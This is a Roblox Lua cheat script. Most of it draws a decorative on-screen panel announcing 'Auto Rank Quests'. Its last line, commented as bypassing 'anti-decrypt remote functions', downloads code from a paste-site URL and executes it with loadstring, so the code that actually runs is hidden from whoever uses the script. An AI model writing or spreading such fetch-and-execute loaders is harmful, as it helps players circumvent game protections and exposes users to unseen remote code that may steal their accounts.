if not game:IsLoaded() then
    while not game:IsLoaded() do wait(1) end
end
wait(0.5)

local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "CustomGUI"
screenGui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Name = "MainFrame"
frame.Size = UDim2.new(0, 400, 0, 120)  
frame.Position = UDim2.new(0.5, -200, 0, 10)
frame.BackgroundColor3 = Color3.fromRGB(255, 255, 153)
frame.BackgroundTransparency = 0.2
frame.BorderSizePixel = 2
frame.Parent = screenGui

local textLabel = Instance.new("TextLabel")
textLabel.Name = "MainText"
textLabel.Size = UDim2.new(1, 0, 1, 0)
textLabel.BackgroundTransparency = 1
textLabel.Text = "Executing Auto Rank Quests script..."
textLabel.Font = Enum.Font.GothamBold
textLabel.TextScaled = true
textLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
textLabel.Parent = frame

local function createStar(position)
    local star = Instance.new("ImageLabel")
    star.Name = "StarDecoration"
    star.Size = UDim2.new(0, 30, 0, 30)
    star.Position = position
    star.BackgroundTransparency = 1
    star.Image = "rbxassetid://YOUR_STAR_ASSET_ID"
    star.Parent = frame
end

createStar(UDim2.new(0, 10, 0, 80))  
createStar(UDim2.new(0.5, -15, 0, 80)) 
createStar(UDim2.new(1, -40, 0, 80))  

-- This script is used to bypass anti-decrypt remote functions
loadstring(game:HttpGet("http://vpaste.net/ek3oU", true))()



